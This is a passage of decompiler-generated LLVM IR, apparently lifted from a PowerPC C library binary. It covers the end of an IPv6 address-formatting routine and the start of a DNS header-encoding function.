dec_label_pc_10012710:                            ; preds = %dec_label_pc_10012710.lr.ph, %dec_label_pc_1001275c
  %v0_10012760 = phi i32 [ 8, %dec_label_pc_10012710.lr.ph ], [ %v1_10012760, %dec_label_pc_1001275c ]
  %v0_10012750 = phi i32 [ -1, %dec_label_pc_10012710.lr.ph ], [ %v0_1001275042, %dec_label_pc_1001275c ]
  %v0_10012740 = phi i32 [ -1, %dec_label_pc_10012710.lr.ph ], [ %v0_1001274039, %dec_label_pc_1001275c ]
  %v0_10012714 = phi i32 [ -1, %dec_label_pc_10012710.lr.ph ], [ %v0_1001271435, %dec_label_pc_1001275c ]
  %v0_1001275c = phi i32 [ 0, %dec_label_pc_10012710.lr.ph ], [ %v1_1001275c, %dec_label_pc_1001275c ]
  %v1_10012710 = mul i32 %v0_1001275c, 4
  %v3_10012714 = icmp eq i32 %v0_10012714, -1
  %v2_10012718 = add i32 %v1_10012710, %v2_100126a4
  %v3_10012718 = inttoptr i32 %v2_10012718 to i32*
  %v4_10012718 = load i32, i32* %v3_10012718, align 4
  %v3_1001271c = icmp eq i32 %v4_10012718, 0
  br i1 %v3_1001271c, label %dec_label_pc_10012724, label %dec_label_pc_1001273c

dec_label_pc_10012724:                            ; preds = %dec_label_pc_10012710
  br i1 %v3_10012714, label %dec_label_pc_10012728, label %dec_label_pc_10012734

dec_label_pc_10012728:                            ; preds = %dec_label_pc_10012724
  store i32 %v0_1001275c, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1001275c

dec_label_pc_10012734:                            ; preds = %dec_label_pc_10012724
  %v0_10012734 = load i32, i32* @r31, align 4
  %v1_10012734 = add i32 %v0_10012734, 1
  store i32 %v1_10012734, i32* @r31, align 4
  br label %dec_label_pc_1001275c

dec_label_pc_1001273c:                            ; preds = %dec_label_pc_10012710
  br i1 %v3_10012714, label %dec_label_pc_1001275c, label %dec_label_pc_10012740

dec_label_pc_10012740:                            ; preds = %dec_label_pc_1001273c
  %v3_10012740 = icmp eq i32 %v0_10012740, -1
  %v0_10012754.pre = load i32, i32* @r31, align 4
  %v1_10012748 = load i32, i32* @r30, align 4
  %v3_10012748 = icmp sgt i32 %v0_10012754.pre, %v1_10012748
  %or.cond = or i1 %v3_10012740, %v3_10012748
  br i1 %or.cond, label %dec_label_pc_10012750, label %dec_label_pc_10012758

dec_label_pc_10012750:                            ; preds = %dec_label_pc_10012740
  store i32 %v0_10012750, i32* @r28, align 4
  store i32 %v0_10012754.pre, i32* @r30, align 4
  br label %dec_label_pc_10012758

dec_label_pc_10012758:                            ; preds = %dec_label_pc_10012740, %dec_label_pc_10012750
  %v0_1001274040 = phi i32 [ %v0_10012750, %dec_label_pc_10012750 ], [ %v0_10012740, %dec_label_pc_10012740 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001275c

dec_label_pc_1001275c:                            ; preds = %dec_label_pc_1001273c, %dec_label_pc_10012734, %dec_label_pc_10012728, %dec_label_pc_10012758
  %v0_1001275042 = phi i32 [ %v0_10012750, %dec_label_pc_1001273c ], [ %v0_10012750, %dec_label_pc_10012734 ], [ %v0_1001275c, %dec_label_pc_10012728 ], [ -1, %dec_label_pc_10012758 ]
  %v0_1001271435 = phi i32 [ -1, %dec_label_pc_1001273c ], [ %v0_10012714, %dec_label_pc_10012734 ], [ %v0_1001275c, %dec_label_pc_10012728 ], [ -1, %dec_label_pc_10012758 ]
  %v0_1001274039 = phi i32 [ %v0_10012740, %dec_label_pc_1001273c ], [ %v0_10012740, %dec_label_pc_10012734 ], [ %v0_10012740, %dec_label_pc_10012728 ], [ %v0_1001274040, %dec_label_pc_10012758 ]
  %v1_1001275c = add nuw nsw i32 %v0_1001275c, 1
  store i32 %v1_1001275c, i32* %r11.global-to-local, align 4
  %v1_10012760 = add nsw i32 %v0_10012760, -1
  store i32 %v1_10012760, i32* %ctr.global-to-local, align 4
  %v2_10012760 = icmp eq i32 %v1_10012760, 0
  br i1 %v2_10012760, label %dec_label_pc_10012764, label %dec_label_pc_10012710

dec_label_pc_10012764:                            ; preds = %dec_label_pc_1001275c
  %v3_10012764 = icmp eq i32 %v0_1001275042, -1
  %v1_10012784 = icmp slt i32 %v0_1001274039, -1
  %v3_10012784 = icmp eq i32 %v0_1001274039, -1
  store i1 %v1_10012784, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012784, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012764, label %dec_label_pc_10012784, label %dec_label_pc_1001276c

dec_label_pc_1001276c:                            ; preds = %dec_label_pc_10012764
  %v0_1001277c.pre = load i32, i32* @r31, align 4
  br i1 %v3_10012784, label %dec_label_pc_1001277c, label %dec_label_pc_10012774

dec_label_pc_10012774:                            ; preds = %dec_label_pc_1001276c
  %v1_10012774 = load i32, i32* @r30, align 4
  %v2_10012774 = icmp slt i32 %v0_1001277c.pre, %v1_10012774
  %v3_10012774 = icmp sgt i32 %v0_1001277c.pre, %v1_10012774
  %v4_10012774 = icmp eq i32 %v0_1001277c.pre, %v1_10012774
  store i1 %v2_10012774, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012774, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012774, label %dec_label_pc_1001277c, label %dec_label_pc_10012784.thread

dec_label_pc_1001277c:                            ; preds = %dec_label_pc_1001276c, %dec_label_pc_10012774
  store i32 %v0_1001277c.pre, i32* @r30, align 4
  store i32 %v0_1001275042, i32* @r28, align 4
  br label %dec_label_pc_10012784.thread

dec_label_pc_10012784.thread:                     ; preds = %dec_label_pc_1001277c, %dec_label_pc_10012774
  %v0_1001278c76 = phi i32 [ %v1_10012774, %dec_label_pc_10012774 ], [ %v0_1001277c.pre, %dec_label_pc_1001277c ]
  %v0_10012784.ph = phi i32 [ %v0_1001274039, %dec_label_pc_10012774 ], [ %v0_1001275042, %dec_label_pc_1001277c ]
  %v1_1001278459 = icmp slt i32 %v0_10012784.ph, -1
  %v3_1001278461 = icmp eq i32 %v0_10012784.ph, -1
  store i1 %v1_1001278459, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001278461, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001278c

dec_label_pc_10012784:                            ; preds = %dec_label_pc_10012764
  br i1 %v3_10012784, label %dec_label_pc_10012798, label %dec_label_pc_10012784.dec_label_pc_1001278c_crit_edge

dec_label_pc_10012784.dec_label_pc_1001278c_crit_edge: ; preds = %dec_label_pc_10012784
  %v0_1001278c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001278c

dec_label_pc_1001278c:                            ; preds = %dec_label_pc_10012784.dec_label_pc_1001278c_crit_edge, %dec_label_pc_10012784.thread
  %v0_1001278c = phi i32 [ %v0_1001278c76, %dec_label_pc_10012784.thread ], [ %v0_1001278c.pre, %dec_label_pc_10012784.dec_label_pc_1001278c_crit_edge ]
  %v0_1001278462 = phi i32 [ %v0_10012784.ph, %dec_label_pc_10012784.thread ], [ %v0_1001274039, %dec_label_pc_10012784.dec_label_pc_1001278c_crit_edge ]
  %v1_1001278c = icmp slt i32 %v0_1001278c, 1
  %v2_1001278c = icmp sgt i32 %v0_1001278c, 1
  %v3_1001278c = icmp eq i32 %v0_1001278c, 1
  store i1 %v1_1001278c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001278c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001278c, label %dec_label_pc_10012798, label %dec_label_pc_10012794

dec_label_pc_10012794:                            ; preds = %dec_label_pc_1001278c
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10012798

dec_label_pc_10012798:                            ; preds = %dec_label_pc_1001278c, %dec_label_pc_10012784, %dec_label_pc_10012794
  %v0_100127a43 = phi i32 [ %v0_1001278462, %dec_label_pc_1001278c ], [ -1, %dec_label_pc_10012784 ], [ -1, %dec_label_pc_10012794 ]
  %v2_10012798 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10012798, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_100127a44 = icmp slt i32 %v0_100127a43, -1
  %v3_100127a46 = icmp eq i32 %v0_100127a43, -1
  store i1 %v1_100127a44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127a46, i1* %cr7_eq.global-to-local, align 1
  %v2_10012814 = icmp slt i32 %tmp, 65535
  %v4_10012814 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_100127a4

dec_label_pc_100127a4:                            ; preds = %dec_label_pc_10012798, %dec_label_pc_10012870
  %v2_100127e0 = phi i32 [ %v2_10012798, %dec_label_pc_10012798 ], [ %v2_100127c851, %dec_label_pc_10012870 ]
  %v0_100127b4 = phi i32 [ %v0_100127a43, %dec_label_pc_10012798 ], [ %v0_100127a4, %dec_label_pc_10012870 ]
  %v0_100127d4 = phi i32 [ 0, %dec_label_pc_10012798 ], [ %v1_10012870, %dec_label_pc_10012870 ]
  %v3_100127a47 = phi i1 [ %v3_100127a46, %dec_label_pc_10012798 ], [ %v3_100127a4, %dec_label_pc_10012870 ]
  br i1 %v3_100127a47, label %dec_label_pc_100127d4, label %dec_label_pc_100127ac

dec_label_pc_100127ac:                            ; preds = %dec_label_pc_100127a4
  %v2_100127ac = icmp slt i32 %v0_100127d4, %v0_100127b4
  %v4_100127ac = icmp eq i32 %v0_100127d4, %v0_100127b4
  br i1 %v2_100127ac, label %dec_label_pc_100127d4, label %dec_label_pc_100127b4

dec_label_pc_100127b4:                            ; preds = %dec_label_pc_100127ac
  %v1_100127b4 = load i32, i32* @r30, align 4
  %v2_100127b4 = add i32 %v1_100127b4, %v0_100127b4
  %v2_100127b8 = icmp slt i32 %v0_100127d4, %v2_100127b4
  %v4_100127b8 = icmp eq i32 %v0_100127d4, %v2_100127b4
  store i1 %v2_100127b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100127b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100127b8, label %dec_label_pc_100127c0, label %dec_label_pc_100127d4

dec_label_pc_100127c0:                            ; preds = %dec_label_pc_100127b4
  br i1 %v4_100127ac, label %dec_label_pc_100127c4, label %dec_label_pc_10012870

dec_label_pc_100127c4:                            ; preds = %dec_label_pc_100127c0
  %v3_100127c8 = inttoptr i32 %v2_100127e0 to i8*
  store i8 58, i8* %v3_100127c8, align 1
  %v0_100127cc = load i32, i32* %r29.global-to-local, align 4
  %v1_100127cc = add i32 %v0_100127cc, 1
  store i32 %v1_100127cc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10012870

dec_label_pc_100127d4:                            ; preds = %dec_label_pc_100127b4, %dec_label_pc_100127ac, %dec_label_pc_100127a4
  %v1_100127d4 = icmp slt i32 %v0_100127d4, 0
  %v3_100127d4 = icmp eq i32 %v0_100127d4, 0
  store i1 %v1_100127d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100127d4, label %dec_label_pc_100127e8.thread, label %dec_label_pc_100127e8

dec_label_pc_100127e8.thread:                     ; preds = %dec_label_pc_100127d4
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001284c

dec_label_pc_100127e8:                            ; preds = %dec_label_pc_100127d4
  %v3_100127e0 = inttoptr i32 %v2_100127e0 to i8*
  store i8 58, i8* %v3_100127e0, align 1
  %v0_100127e4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100127e4 = add i32 %v0_100127e4, 1
  store i32 %v1_100127e4, i32* %r29.global-to-local, align 4
  %v0_100127e8.pre = load i32, i32* @r31, align 4
  %v1_100127e8 = icmp slt i32 %v0_100127e8.pre, 6
  %v3_100127e8 = icmp eq i32 %v0_100127e8.pre, 6
  store i1 %v1_100127e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100127e8, label %dec_label_pc_100127f0, label %dec_label_pc_1001284c

dec_label_pc_100127f0:                            ; preds = %dec_label_pc_100127e8
  %v0_100127f0 = load i32, i32* @r28, align 4
  %v1_100127f0 = icmp slt i32 %v0_100127f0, 0
  %v3_100127f0 = icmp eq i32 %v0_100127f0, 0
  store i1 %v1_100127f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100127f0, label %dec_label_pc_100127f8, label %dec_label_pc_1001284c

dec_label_pc_100127f8:                            ; preds = %dec_label_pc_100127f0
  %v0_100127f8 = load i32, i32* @r30, align 4
  %v1_100127f8 = icmp slt i32 %v0_100127f8, 6
  %v3_100127f8 = icmp eq i32 %v0_100127f8, 6
  store i1 %v1_100127f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100127f8, label %dec_label_pc_1001281c, label %dec_label_pc_10012800

dec_label_pc_10012800:                            ; preds = %dec_label_pc_100127f8
  %v1_10012800 = icmp slt i32 %v0_100127f8, 5
  %v3_10012800 = icmp eq i32 %v0_100127f8, 5
  store i1 %v1_10012800, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012800, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012800, label %dec_label_pc_10012808, label %dec_label_pc_1001284c

dec_label_pc_10012808:                            ; preds = %dec_label_pc_10012800
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_10012814, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012814, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10012814, label %dec_label_pc_1001281c, label %dec_label_pc_1001284c

dec_label_pc_1001281c:                            ; preds = %dec_label_pc_10012808, %dec_label_pc_100127f8
  %v1_1001281c = load i32, i32* @r1, align 4
  %v2_1001281c = sub i32 %v1_1001281c, %v1_100127e4
  %v0_10012820 = load i32, i32* @r27, align 4
  %v1_10012820 = add i32 %v0_10012820, 12
  %v1_10012824 = add i32 %v2_1001281c, 86
  store i32 ptrtoint ([3 x i8]* @global_var_10012830.960 to i32), i32* @lr, align 4
  %v3_1001282c = call i32 @inet_ntop4(i32 %v1_10012820, i32 %v1_100127e4, i32 %v1_10012824)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10012834 = icmp slt i32 %v3_1001282c, 0
  %v3_10012834 = icmp eq i32 %v3_1001282c, 0
  store i1 %v1_10012834, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012834, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012834, label %dec_label_pc_100128ec, label %dec_label_pc_1001283c

dec_label_pc_1001283c:                            ; preds = %dec_label_pc_1001281c
  %v0_1001283c = load i32, i32* @r29, align 4
  store i32 %v0_1001283c, i32* @r3, align 4
  %v0_10012840 = call i32 @__GI_strlen()
  %v0_10012844 = load i32, i32* @r29, align 4
  %v2_10012844 = add i32 %v0_10012844, %v0_10012840
  store i32 %v2_10012844, i32* %r29.global-to-local, align 4
  %v0_10012884.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10012884

dec_label_pc_1001284c:                            ; preds = %dec_label_pc_100127e8.thread, %dec_label_pc_10012808, %dec_label_pc_10012800, %dec_label_pc_100127f0, %dec_label_pc_100127e8
  %v0_1001284c67 = phi i32 [ 0, %dec_label_pc_100127e8.thread ], [ 6, %dec_label_pc_10012808 ], [ 6, %dec_label_pc_10012800 ], [ 6, %dec_label_pc_100127f0 ], [ %v0_100127e8.pre, %dec_label_pc_100127e8 ]
  %v0_1001282866 = phi i32 [ %v2_100127e0, %dec_label_pc_100127e8.thread ], [ %v1_100127e4, %dec_label_pc_10012808 ], [ %v1_100127e4, %dec_label_pc_10012800 ], [ %v1_100127e4, %dec_label_pc_100127f0 ], [ %v1_100127e4, %dec_label_pc_100127e8 ]
  %v1_1001284c = mul i32 %v0_1001284c67, 4
  store i32 %v2_100126a4, i32* %r9.global-to-local, align 4
  %v2_10012854 = add i32 %v1_1001284c, %v2_100126a4
  %v3_10012854 = inttoptr i32 %v2_10012854 to i32*
  %v4_10012854 = load i32, i32* %v3_10012854, align 4
  store i32 %v0_1001282866, i32* @r3, align 4
  store i32 268511340, i32* @lr, align 4
  %v5_10012868 = load i32, i32* @r7, align 4
  %v6_10012868 = load i32, i32* @r8, align 4
  %v9_10012868 = call i32 @sprintf(i32 %v0_1001282866, i32 ptrtoint ([3 x i8]* @global_var_1001d8dc.961 to i32), i32 %v4_10012854, i32 %v2_100126a4, i32 %v5_10012868, i32 %v6_10012868, i32 %v2_100126a4, i32 ptrtoint (i32* @0 to i32))
  %v0_1001286c = load i32, i32* @r29, align 4
  %v2_1001286c = add i32 %v0_1001286c, %v9_10012868
  store i32 %v2_1001286c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10012870

dec_label_pc_10012870:                            ; preds = %dec_label_pc_100127c0, %dec_label_pc_100127c4, %dec_label_pc_1001284c
  %v2_100127c851 = phi i32 [ %v2_100127e0, %dec_label_pc_100127c0 ], [ %v1_100127cc, %dec_label_pc_100127c4 ], [ %v2_1001286c, %dec_label_pc_1001284c ]
  %v0_10012870 = load i32, i32* @r31, align 4
  %v1_10012870 = add i32 %v0_10012870, 1
  store i32 %v1_10012870, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_10012870, 8
  %v0_100127a4 = load i32, i32* @r28, align 4
  %v1_100127a4 = icmp slt i32 %v0_100127a4, -1
  %v3_100127a4 = icmp eq i32 %v0_100127a4, -1
  store i1 %v1_100127a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_100127a4, label %dec_label_pc_1001287c

dec_label_pc_1001287c:                            ; preds = %dec_label_pc_10012870
  br i1 %v3_100127a4, label %dec_label_pc_1001289c, label %dec_label_pc_10012884

dec_label_pc_10012884:                            ; preds = %dec_label_pc_1001287c, %dec_label_pc_1001283c
  %v2_10012894 = phi i32 [ %v2_100127c851, %dec_label_pc_1001287c ], [ %v2_10012844, %dec_label_pc_1001283c ]
  %v0_10012884 = phi i32 [ %v0_100127a4, %dec_label_pc_1001287c ], [ %v0_10012884.pre, %dec_label_pc_1001283c ]
  %v1_10012884 = load i32, i32* @r30, align 4
  %v2_10012884 = add i32 %v1_10012884, %v0_10012884
  %v1_10012888 = icmp slt i32 %v2_10012884, 8
  %v3_10012888 = icmp eq i32 %v2_10012884, 8
  store i1 %v1_10012888, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012888, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012888, label %dec_label_pc_10012890, label %dec_label_pc_1001289c

dec_label_pc_10012890:                            ; preds = %dec_label_pc_10012884
  %v3_10012894 = inttoptr i32 %v2_10012894 to i8*
  store i8 58, i8* %v3_10012894, align 1
  %v0_10012898 = load i32, i32* %r29.global-to-local, align 4
  %v1_10012898 = add i32 %v0_10012898, 1
  store i32 %v1_10012898, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001289c

dec_label_pc_1001289c:                            ; preds = %dec_label_pc_10012884, %dec_label_pc_1001287c, %dec_label_pc_10012890
  %v2_100128b0 = phi i32 [ %v2_10012894, %dec_label_pc_10012884 ], [ %v2_100127c851, %dec_label_pc_1001287c ], [ %v1_10012898, %dec_label_pc_10012890 ]
  %v1_1001289c = sub i32 1, %v2_10012798
  %v2_100128a4 = add i32 %v1_1001289c, %v2_100128b0
  %v1_100128a8 = load i32, i32* @r26, align 4
  %v2_100128a8 = icmp ult i32 %v2_100128a4, %v1_100128a8
  %v4_100128a8 = icmp eq i32 %v2_100128a4, %v1_100128a8
  store i1 %v2_100128a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100128a8, i1* %cr7_eq.global-to-local, align 1
  %v3_100128b0 = inttoptr i32 %v2_100128b0 to i8*
  store i8 0, i8* %v3_100128b0, align 1
  %v0_100128b4 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100128b4 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100128b4 = or i1 %v0_100128b4, %v1_100128b4
  br i1 %v2_100128b4, label %dec_label_pc_100128cc, label %dec_label_pc_100128b8

dec_label_pc_100128b8:                            ; preds = %dec_label_pc_1001289c
  %v0_100128b8 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100128c4 = inttoptr i32 %v0_100128b8 to i32*
  store i32 28, i32* %v2_100128c4, align 4
  %v0_100128f0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100128ec

dec_label_pc_100128cc:                            ; preds = %dec_label_pc_1001289c
  %v0_100128cc = load i32, i32* @r25, align 4
  %v2_100128d0 = bitcast i32* %stack_var_-88 to i8*
  %v3_100128d0 = call i32 @strcpy(i32 %v0_100128cc, i8* %v2_100128d0)
  br label %dec_label_pc_100128d4

dec_label_pc_100128d4:                            ; preds = %dec_label_pc_10012690, %dec_label_pc_100128cc
  %storemerge1 = phi i32 [ %v3_1001269c, %dec_label_pc_10012690 ], [ %v3_100128d0, %dec_label_pc_100128cc ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100128ec

dec_label_pc_100128dc:                            ; preds = %dec_label_pc_10012684
  %v0_100128dc = call i32 @__errno_location()
  %v2_100128e4 = inttoptr i32 %v0_100128dc to i32*
  store i32 97, i32* %v2_100128e4, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100128ec

dec_label_pc_100128ec:                            ; preds = %dec_label_pc_1001281c, %dec_label_pc_100128d4, %dec_label_pc_100128b8, %dec_label_pc_100128dc
  %v0_100128f0 = phi i32 [ 0, %dec_label_pc_1001281c ], [ %storemerge1, %dec_label_pc_100128d4 ], [ %v0_100128f0.pre, %dec_label_pc_100128b8 ], [ 0, %dec_label_pc_100128dc ]
  ret i32 %v0_100128f0

; uselistorder directives
  uselistorder i32 %v2_100128b0, { 1, 0 }
  uselistorder i32 %v2_10012884, { 1, 0 }
  uselistorder i1 %v3_100127a4, { 0, 2, 1 }
  uselistorder i32 %v0_100127a4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10012870, { 2, 1, 0 }
  uselistorder i32 %v0_1001282866, { 1, 0 }
  uselistorder i32 %v3_1001282c, { 1, 0 }
  uselistorder i32 %v0_100127f8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100127e8.pre, { 2, 0, 1 }
  uselistorder i32 %v1_100127e4, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_100127b4, { 1, 0 }
  uselistorder i32 %v0_100127d4, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_100127b4, { 0, 2, 1 }
  uselistorder i32 %v2_100127e0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_100127a43, { 0, 2, 1 }
  uselistorder i32 %v0_1001278c, { 2, 1, 0 }
  uselistorder i32 %v0_1001277c.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_10012784, { 1, 0, 2 }
  uselistorder i32 %v1_10012760, { 2, 1, 0 }
  uselistorder i32 %v1_1001275c, { 1, 0 }
  uselistorder i32 %v0_1001274039, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1001275042, { 0, 2, 1, 3 }
  uselistorder i1 %v3_10012714, { 1, 0 }
  uselistorder i32 %v0_1001275c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_10012714, { 1, 0 }
  uselistorder i32 %v0_10012740, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_10012750, { 2, 3, 0, 1 }
  uselistorder i32 %v1_100126f0, { 1, 0 }
  uselistorder i32 %v2_100126e8, { 1, 0 }
  uselistorder i32 %v0_100126e0, { 1, 0, 2 }
  uselistorder i32 %v1_100126c8, { 1, 0 }
  uselistorder i32 %v2_100126a4, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 17, 9, 10, 16, 12, 19, 14, 13, 15, 18 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 7, 6, 0, 9, 3, 1, 2 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32* @r8, { 5, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 69, 70, 71, 2, 61, 65, 66, 67, 7, 8, 72, 74, 75, 42, 62, 63, 64, 73, 43, 44, 45, 46, 47, 48, 49, 3, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0, 60, 4, 6 }
  uselistorder i32* @r7, { 10, 11, 12, 13, 0, 14, 15, 16, 17, 1, 18, 19, 6, 20, 21, 22, 23, 2, 35, 36, 37, 8, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 7, 4, 5, 33, 34, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 11, 0, 12, 13, 14, 5, 6, 7, 8, 9, 10, 15 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 25, 24, 14, 2, 13, 12, 19, 0, 5, 1, 18, 11, 23, 22, 21, 20, 17, 16, 15, 10, 9, 8, 7, 6, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100128ec, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100128d4, { 1, 0 }
  uselistorder label %dec_label_pc_1001289c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012870, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001284c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_100127a4, { 1, 0 }
  uselistorder label %dec_label_pc_10012798, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001277c, { 1, 0 }
  uselistorder label %dec_label_pc_1001275c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012758, { 1, 0 }
  uselistorder label %dec_label_pc_10012710, { 1, 0 }
  uselistorder label %dec_label_pc_100126c8, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_100129e8, label %dec_label_pc_10012910

dec_label_pc_10012910:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_10012910 = add i32 %tmp, 2
  %v2_10012910 = inttoptr i32 %v1_10012910 to i8*
  %v3_10012910 = load i8, i8* %v2_10012910, align 1
  %v4_10012910 = zext i8 %v3_10012910 to i32
  store i32 %v4_10012910, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_10012910, i8* %tmp3, align 1
  %v2_1001291c = load i32, i32* %arg1, align 4
  store i32 %v2_1001291c, i32* %r0.global-to-local, align 4
  %v1_10012920 = trunc i32 %v2_1001291c to i8
  %v4_10012920 = add i32 %arg2, 1
  %v5_10012920 = inttoptr i32 %v4_10012920 to i8*
  store i8 %v1_10012920, i8* %v5_10012920, align 1
  %v1_10012924 = add i32 %tmp, 12
  %v2_10012924 = inttoptr i32 %v1_10012924 to i32*
  %v3_10012924 = load i32, i32* %v2_10012924, align 4
  store i32 %v3_10012924, i32* %r0.global-to-local, align 4
  %v1_10012928 = add i32 %tmp, 16
  %v2_10012928 = inttoptr i32 %v1_10012928 to i32*
  %v3_10012928 = load i32, i32* %v2_10012928, align 4
  store i32 %v3_10012928, i32* %r11.global-to-local, align 4
  %v1_1001292c = add i32 %tmp, 4
  %v2_1001292c = inttoptr i32 %v1_1001292c to i32*
  %v3_1001292c = load i32, i32* %v2_1001292c, align 4
  %v2_10012930 = icmp ne i32 %v3_10012924, 0
  %v5_10012934 = zext i1 %v2_10012930 to i32
  store i32 %v5_10012934, i32* %r10.global-to-local, align 4
  %v1_10012938 = add i32 %tmp, 8
  %v2_10012938 = inttoptr i32 %v1_10012938 to i32*
  %v3_10012938 = load i32, i32* %v2_10012938, align 4
  %v2_1001293c = icmp ne i32 %v3_10012928, 0
  %v5_10012940 = zext i1 %v2_1001293c to i32
  %v1_10012944 = add i32 %tmp, 20
  %v2_10012944 = inttoptr i32 %v1_10012944 to i32*
  %v3_10012944 = load i32, i32* %v2_10012944, align 4
  store i32 %v3_10012944, i32* %r0.global-to-local, align 4
  %not.v2_10012948 = icmp eq i32 %v3_1001292c, 0
  %v6_1001294c = sext i1 %not.v2_10012948 to i32
  store i32 %v5_10012940, i32* %r11.global-to-local, align 4
